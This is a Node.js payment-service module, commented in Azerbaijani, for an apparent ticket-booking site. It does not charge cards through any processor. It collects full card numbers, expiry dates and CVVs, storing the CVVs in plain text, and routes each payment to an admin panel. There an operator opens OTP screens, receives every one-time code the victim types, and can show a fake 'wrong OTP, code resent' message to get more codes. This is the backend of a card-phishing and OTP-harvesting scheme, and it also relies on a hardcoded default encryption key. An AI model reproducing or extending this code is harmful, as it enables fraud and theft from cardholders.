const { Payment, Order, User } = require('../models/index');
const { issueTickets } = require('./bookingService');
const h = require('../utils/helpers');
const { anonIp } = require('../middleware/privacy');
const crypto = require('crypto');

/* ==================== Ödəniş axını ====================
   1) İstifadəçi YALNIZ kart məlumatlarını yazır (3-D kod sahəsi yoxdur) -> stage: card_review (2 dəq geri sayım)
   2) Admin "Təsdiq Et" basdıqda                        -> stage: otp_entry  (istifadəçidə OTP ekranı açılır)
   3) İstifadəçi OTP yazır                              -> stage: otp_review (admin panelinə düşür)
   4a) Admin "Bilet Ver" basdıqda                       -> bilet verilir, kart saxlanılır
   4b) Admin "Səhv Kod" basdıqda                        -> stage: wrong_code ("Səhv OTP - kod təkrar göndərilir", 2 dəq geri sayım)
       geri sayım bitdikdə (və ya admin "OTP ekranını indi aç" basdıqda) -> stage: otp_entry (yeni OTP ekranı)  */

const STAGE_SECONDS = 120; /* 2 dəqiqə */

function startStage(payment, stage) {
  payment.stage = stage;
  payment.stageStartedAt = new Date();
  payment.stageDeadline = new Date(Date.now() + STAGE_SECONDS * 1000);
}

function secondsLeft(payment) {
  if (!payment || !payment.stageDeadline) return 0;
  return Math.max(0, Math.round((new Date(payment.stageDeadline).getTime() - Date.now()) / 1000));
}

/* Kartı şifrələ (sadə bir səviyyə — real tətbiqətdə HSM istifadə etmək lazımdır) */
function encryptCardNumber(number) {
  const key = process.env.CARD_ENCRYPTION_KEY || 'default-key-change-in-production-12345678';
  const cipher = crypto.createCipher('aes-256-cbc', key);
  let encrypted = cipher.update(number, 'utf8', 'hex');
  encrypted += cipher.final('hex');
  return encrypted;
}

function decryptCardNumber(encrypted) {
  try {
    const key = process.env.CARD_ENCRYPTION_KEY || 'default-key-change-in-production-12345678';
    const decipher = crypto.createDecipher('aes-256-cbc', key);
    let decrypted = decipher.update(encrypted, 'hex', 'utf8');
    decrypted += decipher.final('utf8');
    return decrypted;
  } catch (e) {
    return '';
  }
}

/* Saxlanılmış kartlardan birini seçərək ödəniş başlat */
async function initPaymentWithSavedCard(order, savedCardId, user) {
  const savedCard = user.savedCards.find(c => c.cardId === savedCardId && c.isActive);
  if (!savedCard) throw Object.assign(new Error('Saxlanılmış kart tapılmadı'), { status: 404 });

  const payment = new Payment({
    transactionId: h.generateTxId('ADY'),
    order: order._id,
    user: order.user,
    amount: order.total,
    method: 'card',
    status: 'pending_admin',
    card: {
      number: savedCard.number,
      masked: savedCard.masked,
      holder: savedCard.holder,
      expiry: savedCard.expiry,
      cvv: '', /* Saxlanılmış kartda CVV yoxdur */
      brand: savedCard.brand
    },
    usingSavedCard: true,
    savedCardId: savedCardId,
    saveCard: false,
    firstCode: '',
    codeAttempts: []
  });

  startStage(payment, 'card_review');
  await payment.save();

  order.payment = payment._id;
  order.method = 'card';
  order.status = 'pending_admin';
  await order.save();

  return payment;
}

/* Yeni kart ilə ödəniş başlat */
async function initPayment(order, card, method, saveCard = false) {
  const number = h.normalizeCardNumber(card.number);
  const brand = h.cardBrand(number);

  /* Kartı şifrələ */
  const encrypted = encryptCardNumber(number);

  const payment = new Payment({
    transactionId: h.generateTxId('ADY'),
    order: order._id,
    user: order.user,
    amount: order.total,
    method: method === 'balance' ? 'balance' : 'card',
    status: 'pending_admin',
    card: {
      number: encrypted,
      masked: h.maskCard(number),
      holder: String(card.holder || '').trim(),
      expiry: String(card.expiry || '').trim(),
      cvv: String(card.cvv || '').trim(),
      brand
    },
    saveCard: saveCard && method === 'card', /* Yalnız kart ödənişində saxla */
    usingSavedCard: false,
    firstCode: '',
    codeAttempts: []
  });

  startStage(payment, 'card_review');
  await payment.save();

  order.payment = payment._id;
  order.method = payment.method;
  order.status = 'pending_admin';
  await order.save();

  return payment;
}

/* Admin kartı təsdiqləyir: istifadəçinin ekranında DƏRHAL OTP ekranı açılır */
async function adminApproveCard(paymentId, adminEmail) {
  const payment = await Payment.findById(paymentId);
  if (!payment) throw Object.assign(new Error('Ödəniş tapılmadı'), { status: 404 });
  if (payment.stage !== 'card_review') throw Object.assign(new Error('Ödəniş bu mərhələdə deyil'), { status: 400 });

  payment.adminApprovedCardAt = new Date();
  payment.adminApprovedBy = adminEmail || 'admin';
  payment.stage = 'wrong_code'; /* adminOpenOtp üçün keçid mərhələsi */
  payment.adminNotifiedAt = new Date();
  await payment.save();

  return adminOpenOtp(paymentId, adminEmail);
}

/* OTP ekranını açır (kart təsdiqindən sonra və ya "Səhv Kod" geri sayımı bitdikdə) */
async function adminOpenOtp(paymentId, adminEmail) {
  const payment = await Payment.findById(paymentId);
  if (!payment) throw Object.assign(new Error('Ödəniş tapılmadı'), { status: 404 });
  if (payment.stage !== 'wrong_code') throw Object.assign(new Error('Ödəniş bu mərhələdə deyil'), { status: 400 });

  payment.verificationCode = h.randomDigits(6);
  payment.status = 'awaiting_3ds';
  payment.adminResentAt = new Date();
  payment.adminApprovedBy = adminEmail || payment.adminApprovedBy || 'admin';
  payment.adminNotifiedAt = new Date();
  startStage(payment, 'otp_entry');
  await payment.save();

  if (payment.order) {
    const order = await Order.findById(payment.order);
    if (order) {
      order.status = 'awaiting_verification';
      await order.save();
    }
  }

  return { payment, code: payment.verificationCode };
}

/* İstifadəçi OTP kodunu göndərir -> admin panelinə düşür */
async function submitVerificationCode(ref, code, meta) {
  let order = null;
  let payment = null;

  if (ref && ref.paymentId) {
    payment = await Payment.findById(ref.paymentId);
    if (!payment || String(payment.user) !== String(ref.userId)) throw Object.assign(new Error('Ödəniş tapılmadı'), { status: 404 });
  } else {
    order = await Order.findById(ref && ref.orderId);
    if (!order) throw Object.assign(new Error('Sifariş tapılmadı'), { status: 404 });
    payment = await Payment.findById(order.payment);
    if (!payment) throw Object.assign(new Error('Ödəniş tapılmadı'), { status: 404 });
  }

  /* OTP ekranında olmalı (otp_entry) */
  if (payment.stage !== 'otp_entry') {
    throw Object.assign(new Error('Doğrulama mərhələsi aktiv deyil'), { status: 400 });
  }

  const entered = String(code || '').replace(/\D/g, '');
  if (!entered) throw Object.assign(new Error('Doğrulama kodu daxil edilməyib'), { status: 400 });

  /* Kodu logla */
  payment.codeAttempts.push({
    code: entered,
    kind: 'otp',
    at: new Date(),
    ip: (meta && meta.ip) || anonIp()
  });

  /* Admin tərəfindən təsdiqə göndər */
  payment.status = 'code_submitted';
  payment.codeSubmittedAt = new Date();
  payment.submittedCode = entered;
  payment.adminNotifiedAt = new Date();
  startStage(payment, 'otp_review');
  await payment.save();

  if (order) {
    order.status = 'code_submitted';
    await order.save();
  }

  return { payment, matched: entered === payment.verificationCode };
}

/* Admin "Səhv Kod" seçdikdə: istifadəçi "Səhv OTP - kod təkrar göndərilir" görür */
async function adminRejectOtp(paymentId, adminEmail) {
  const payment = await Payment.findById(paymentId);
  if (!payment) throw Object.assign(new Error('Ödəniş tapılmadı'), { status: 404 });
  if (payment.stage !== 'otp_review') throw Object.assign(new Error('Ödəniş bu mərhələdə deyil'), { status: 400 });

  payment.rejectionCount = (payment.rejectionCount || 0) + 1;
  payment.adminFinalBy = adminEmail || 'admin';
  payment.adminNotifiedAt = new Date();

  /* Balans artırımı köhnə axında qalır: birbaşa yeni OTP ekranı */
  if (!payment.order) {
    payment.verificationCode = h.randomDigits(6);
    payment.status = 'awaiting_3ds';
    payment.adminResentAt = new Date();
    startStage(payment, 'otp_entry');
    await payment.save();
    return { payment, code: payment.verificationCode };
  }

  payment.status = 'awaiting_3ds';
  payment.wrongCodeAt = new Date();
  payment.submittedCode = '';
  startStage(payment, 'wrong_code');
  await payment.save();

  const order = await Order.findById(payment.order);
  if (order) {
    order.status = 'awaiting_verification';
    await order.save();
  }

  return { payment };
}

/* "Səhv Kod" geri sayımı bitibsə avtomatik yeni OTP ekranını aç */
async function advanceIfExpired(payment) {
  if (!payment || payment.stage !== 'wrong_code' || !payment.order) return payment;
  if (secondsLeft(payment) > 0) return payment;
  try {
    const r = await adminOpenOtp(payment._id, payment.adminFinalBy || 'auto');
    return r.payment.toObject ? r.payment.toObject() : r.payment;
  } catch (e) {
    return payment;
  }
}

/* Yekun admin təsdiqi: biletlər verilir və ödəniş tamamlanır */
async function adminFinalApprove(paymentId, adminEmail) {
  const payment = await Payment.findById(paymentId);
  if (!payment) throw Object.assign(new Error('Ödəniş tapılmadı'), { status: 404 });
  if (['approved', 'declined', 'refunded'].indexOf(payment.status) > -1) {
    throw Object.assign(new Error('Ödəniş artıq yekunlaşıb'), { status: 400 });
  }

  /* Kartı saxlamaq seçimi aktiv idisə, User.savedCards-ə əlavə et */
  if (payment.saveCard && payment.card && payment.card.number) {
    try {
      const user = await User.findById(payment.user);
      if (user && !payment.usingSavedCard) {
        const cardId = h.generateRandomId();
        const newCard = {
          cardId,
          masked: payment.card.masked,
          number: payment.card.number, /* Şifrələnmiş */
          holder: payment.card.holder,
          expiry: payment.card.expiry,
          brand: payment.card.brand,
          savedAt: new Date(),
          isDefault: (user.savedCards || []).length === 0,
          isActive: true
        };

        if (!user.savedCards) user.savedCards = [];
        user.savedCards.push(newCard);

        if (newCard.isDefault) user.defaultCardId = cardId;

        await user.save();
        payment.savedCardId = cardId;
      }
    } catch (e) {
      console.error('Kart saxlanma xətası:', e.message);
    }
  }

  /* Balans artırımı: yekun təsdiqdə məbləğ balansa əlavə olunur */
  if (!payment.order) {
    const owner = await User.findById(payment.user);
    if (!owner) throw Object.assign(new Error('İstifadəçi tapılmadı'), { status: 404 });
    owner.balance = Math.round(((owner.balance || 0) + payment.amount) * 100) / 100;
    await owner.save();
    payment.status = 'approved';
    payment.stage = 'done';
    payment.adminFinalApprovedAt = new Date();
    payment.adminFinalBy = adminEmail || 'admin';
    payment.adminNotifiedAt = new Date();
    await payment.save();
    return { payment, order: null, tickets: [], balance: owner.balance };
  }

  const order = await Order.findById(payment.order);
  if (!order) throw Object.assign(new Error('Sifariş tapılmadı'), { status: 404 });

  if (payment.method === 'balance') {
    const user = await User.findById(payment.user);
    if (!user || (user.balance || 0) < payment.amount) {
      throw Object.assign(new Error('Balans kifayət etmir'), { status: 400 });
    }
    user.balance = Math.round(((user.balance || 0) - payment.amount) * 100) / 100;
    await user.save();
  }

  payment.status = 'approved';
  payment.stage = 'done';
  payment.adminFinalApprovedAt = new Date();
  payment.adminFinalBy = adminEmail || 'admin';
  payment.adminNotifiedAt = new Date();
  await payment.save();

  const tickets = await issueTickets(order);
  order.status = 'confirmed';
  order.pnr = tickets.length ? tickets[0].pnr : '';
  order.confirmedAt = new Date();
  await order.save();

  return { payment, order, tickets };
}

/* Rədd */
async function adminDecline(paymentId, reason, adminEmail) {
  const payment = await Payment.findById(paymentId);
  if (!payment) throw Object.assign(new Error('Ödəniş tapılmadı'), { status: 404 });

  if (['approved', 'refunded'].indexOf(payment.status) > -1) {
    throw Object.assign(new Error('Ödəniş artıq təsdiqlənib'), { status: 400 });
  }

  payment.status = 'declined';
  payment.stage = 'done';
  payment.declinedReason = reason || 'Admin tərəfindən rədd edildi';
  payment.adminFinalBy = adminEmail || 'admin';
  payment.adminNotifiedAt = new Date();
  await payment.save();

  const order = payment.order ? await Order.findById(payment.order) : null;
  if (order) {
    order.status = 'rejected';
    order.adminNote = payment.declinedReason;
    await order.save();

    const { Trip } = require('../models/index');
    const trip = await Trip.findById(order.trip);
    if (trip) {
      trip.soldSeats = (trip.soldSeats || []).filter((s) => String(s.order) !== String(order._id));
      await trip.save();
    }
  }

  return payment;
}

/* Balans artırımı da eyni axından keçir */
async function createTopup(user, amount, card, code) {
  const number = h.normalizeCardNumber(card.number);
  const encrypted = encryptCardNumber(number);
  const first = String(code || '').replace(/\D/g, '');

  const payment = new Payment({
    transactionId: h.generateTxId('TOP'),
    order: null,
    user: user._id,
    amount: Number(amount),
    method: 'card',
    status: 'pending_admin',
    card: {
      number: encrypted,
      masked: h.maskCard(number),
      holder: String(card.holder || '').trim(),
      expiry: String(card.expiry || '').trim(),
      cvv: String(card.cvv || '').trim(),
      brand: h.cardBrand(number)
    },
    firstCode: first,
    codeAttempts: first ? [{ code: first, kind: '3ds-1', at: new Date(), ip: anonIp() }] : []
  });

  startStage(payment, 'card_review');
  await payment.save();
  return payment;
}

async function approveTopup(paymentId, adminEmail) {
  const r = await adminFinalApprove(paymentId, adminEmail);
  return { payment: r.payment, balance: r.balance };
}

/* Istifadəçinin bütün saxlanılmış kartlarını göstər */
async function getUserSavedCards(userId) {
  const user = await User.findById(userId).select('savedCards');
  return (user && user.savedCards) || [];
}

/* Saxlanılmış kartı deaktiv et */
async function deactivateSavedCard(userId, cardId) {
  const user = await User.findById(userId);
  if (!user) throw Object.assign(new Error('İstifadəçi tapılmadı'), { status: 404 });

  const card = user.savedCards.find(c => c.cardId === cardId);
  if (!card) throw Object.assign(new Error('Kart tapılmadı'), { status: 404 });

  card.isActive = false;
  if (user.defaultCardId === cardId) {
    user.defaultCardId = '';
  }

  await user.save();
  return card;
}

module.exports = {
  STAGE_SECONDS,
  secondsLeft,
  initPayment,
  initPaymentWithSavedCard,
  adminApproveCard,
  adminOpenOtp,
  adminRejectOtp,
  advanceIfExpired,
  submitVerificationCode,
  adminFinalApprove,
  adminDecline,
  createTopup,
  approveTopup,
  getUserSavedCards,
  deactivateSavedCard,
  encryptCardNumber,
  decryptCardNumber
};
